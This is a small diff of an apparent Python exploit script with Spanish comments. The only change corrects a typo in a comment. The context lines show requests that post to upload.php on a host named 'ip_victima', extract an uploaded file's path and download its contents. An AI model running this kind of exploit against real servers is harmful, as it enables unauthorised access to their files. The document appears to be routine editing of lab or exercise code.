@@ -30,6 +30,6 @@ r = requests.post(f'http://{ip_victima}/upload.php',
 # Extracción de la URL del archivo del servidor
 (url, ) = re.findall(r'path:</p><a href="(.*)">\1</a>', r.text)
 
-# Descara y muestra en pantalla del contenido del archivo
+# Descarga y muestra en pantalla el contenido del archivo
 r = requests.get(f"http://{ip_victima}/{url}")
 sys.stdout.buffer.write(r.content)
